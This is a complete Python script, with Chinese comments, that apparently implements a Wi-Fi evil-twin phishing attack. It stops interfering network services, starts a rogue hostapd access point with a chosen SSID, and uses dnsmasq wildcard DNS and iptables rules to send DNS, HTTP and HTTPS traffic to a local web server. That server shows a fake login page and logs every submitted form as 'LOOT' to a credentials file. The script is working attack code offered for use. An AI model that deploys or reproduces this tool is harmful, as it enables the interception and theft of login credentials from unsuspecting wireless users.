import os
import sys
import time
import subprocess
import argparse
import shutil
from http.server import BaseHTTPRequestHandler, HTTPServer

# ================= 配置区域 =================
AP_IP = "10.0.0.1"
NETMASK = "255.255.255.0"
DHCP_RANGE = "10.0.0.10,10.0.0.100,12h"
WEB_PORT = 80
TMP_DIR = "/tmp/eviltwin"

if not os.path.exists(TMP_DIR):
    os.makedirs(TMP_DIR)


def log(msg, level="INFO"):
    """写入日志并打印，方便前端读取"""
    timestamp = time.strftime("%H:%M:%S", time.localtime())
    formatted_msg = f"[{timestamp}] [{level}] {msg}"
    print(formatted_msg)
    sys.stdout.flush()
    # 同时写入文件供 debug
    with open(f"{TMP_DIR}/debug.log", "a") as f:
        f.write(formatted_msg + "\n")


# ================= 钓鱼 Web 服务器 =================
class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # 禁止打印每一个 HTTP 请求，防止刷屏

    def do_GET(self):
        # 劫持所有请求返回钓鱼页面 (Captive Portal 行为)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        template_path = f"{TMP_DIR}/index.html"
        if os.path.exists(template_path):
            with open(template_path, 'r', encoding='utf-8') as f:
                self.wfile.write(f.read().encode('utf-8'))
        else:
            self.wfile.write(b"<h1>Error: Template not found</h1>")

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')

            # 记录捕获到的数据
            log(f"捕获到 POST 数据: {post_data}", "LOOT")
            with open(f"{TMP_DIR}/captured_creds.txt", "a") as f:
                f.write(f"{post_data}\n")

            # 返回简单的响应，模拟加载
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(
                b"<h1>Validating...</h1><script>setTimeout(function(){alert('Connection Timed Out. Please try again.');}, 2000);</script>")
        except Exception as e:
            log(f"POST Error: {e}", "ERROR")


def start_web_server():
    try:
        # 监听所有接口
        server = HTTPServer(('0.0.0.0', WEB_PORT), PhishingHandler)
        log(f"Web Server 已启动在 {AP_IP}:{WEB_PORT}", "WEB")
        server.serve_forever()
    except Exception as e:
        log(f"Web Server 启动失败: {e}", "ERROR")


# ================= 核心功能函数 =================
def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def check_dependencies():
    """检查并尝试修复环境"""
    tools = ["hostapd", "dnsmasq"]
    for tool in tools:
        if not shutil.which(tool):
            log(f"找不到 {tool}，尝试 apt 安装...", "WARN")
            run_cmd(f"apt-get update && apt-get install -y {tool}")


def cleanup_network():
    """清理网络干扰进程"""
    log("清理干扰进程 (NetworkManager, wpa_supplicant)...", "SYSTEM")
    # 停止常见干扰服务
    run_cmd("systemctl stop NetworkManager")
    run_cmd("systemctl stop wpa_supplicant")
    # 杀掉可能占用端口的进程
    run_cmd("killall hostapd dnsmasq wpa_supplicant dhclient")
    # 解锁射频
    run_cmd("rfkill unblock wlan")
    run_cmd("rfkill unblock all")
    time.sleep(2)


def setup_interface(interface):
    log(f"配置网卡 {interface} IP地址...", "NET")
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"ip addr flush dev {interface}")
    run_cmd(f"ip link set {interface} up")
    run_cmd(f"ip addr add {AP_IP}/24 dev {interface}")


def start_dnsmasq(interface):
    log("启动 Dnsmasq (DHCP & DNS)...", "SRV")
    conf = f"""
interface={interface}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{AP_IP}
"""
    with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f:
        f.write(conf)

    proc = subprocess.Popen(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf -d", shell=True, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
    if proc.poll() is not None:
        log("Dnsmasq 启动失败", "ERROR")


def start_hostapd(interface, ssid, channel):
    log(f"启动 Hostapd (SSID: {ssid} / CH: {channel})...", "AP")

    # Hostapd 配置 (增强版)
    conf = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=0
"""
    with open(f"{TMP_DIR}/hostapd.conf", "w") as f:
        f.write(conf)

    cmd = f"hostapd {TMP_DIR}/hostapd.conf"

    # 使用 Popen 启动并重定向输出到文件
    with open(f"{TMP_DIR}/hostapd.log", "w") as log_file:
        proc = subprocess.Popen(cmd, shell=True, stdout=log_file, stderr=subprocess.STDOUT)

    time.sleep(2)
    if proc.poll() is not None:
        log("❌ Hostapd 启动失败！请检查网卡是否支持 AP 模式。", "ERROR")
    else:
        log("Hostapd 正在运行", "SUCCESS")


def setup_iptables(interface):
    log("配置 IPTables 流量劫持...", "FW")
    run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
    run_cmd("iptables --flush")
    run_cmd("iptables -t nat --flush")

    # DNS 重定向 (重要)
    run_cmd(f"iptables -t nat -A PREROUTING -i {interface} -p udp --dport 53 -j DNAT --to {AP_IP}")
    # HTTP 重定向
    run_cmd(f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to {AP_IP}:{WEB_PORT}")
    run_cmd(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to {AP_IP}:{WEB_PORT}")  # 尝试捕获 HTTPS (虽然会有证书错误)

    run_cmd("iptables -t nat -A POSTROUTING -j MASQUERADE")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", required=True)
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--channel", default="6")
    parser.add_argument("--template", default="<h1>Login</h1>")
    args = parser.parse_args()

    # 0. 写入模板
    with open(f"{TMP_DIR}/index.html", "w", encoding='utf-8') as f:
        f.write(args.template)

    # 1. 环境准备
    check_dependencies()
    cleanup_network()

    # 2. 启动组件
    setup_interface(args.interface)
    start_dnsmasq(args.interface)
    start_hostapd(args.interface, args.ssid, args.channel)
    setup_iptables(args.interface)

    # 3. 启动 Web Server
    log(f"双子热点已就绪。SSID: {args.ssid}", "READY")
    start_web_server()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Stopping...", "INFO")
        run_cmd("killall hostapd dnsmasq")